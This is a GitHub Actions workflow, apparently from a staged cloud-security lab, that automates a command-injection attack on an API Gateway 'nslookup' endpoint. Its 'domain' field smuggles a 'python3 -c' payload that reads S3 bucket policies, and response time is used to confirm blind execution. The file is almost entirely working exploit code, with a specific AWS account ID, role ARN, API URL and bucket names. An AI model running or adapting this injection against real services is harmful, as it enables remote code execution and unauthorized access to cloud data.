name: Stage2-21-Test-BucketPolicy-Read

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Test bucket policy access
        run: |
          python3 - <<'PY'
          import os
          import time
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          buckets = [
              "userad88e2b168aa387e",
              "logad88e2b168aa387e"
          ]

          for bucket in buckets:
              python_code = (
                  "import boto3;"
                  "s=boto3.client("
                  "'s3',"
                  "region_name='us-east-1',"
                  "endpoint_url='https://s3.us-east-1.amazonaws.com'"
                  ");"
                  f"s.get_bucket_policy(Bucket={bucket!r});"
              )

              injected = (
                  "example.com; "
                  "python3 -c "
                  + repr(python_code)
                  + " >/tmp/policy_result 2>&1 && sleep 8"
              )

              start = time.monotonic()

              response = requests.post(
                  api,
                  json={"domain": injected},
                  auth=auth,
                  timeout=30
              )

              elapsed = time.monotonic() - start

              print("BUCKET=" + bucket)
              print("HTTP=" + str(response.status_code))
              print("ELAPSED=%.2f" % elapsed)
              print("---")
          PY
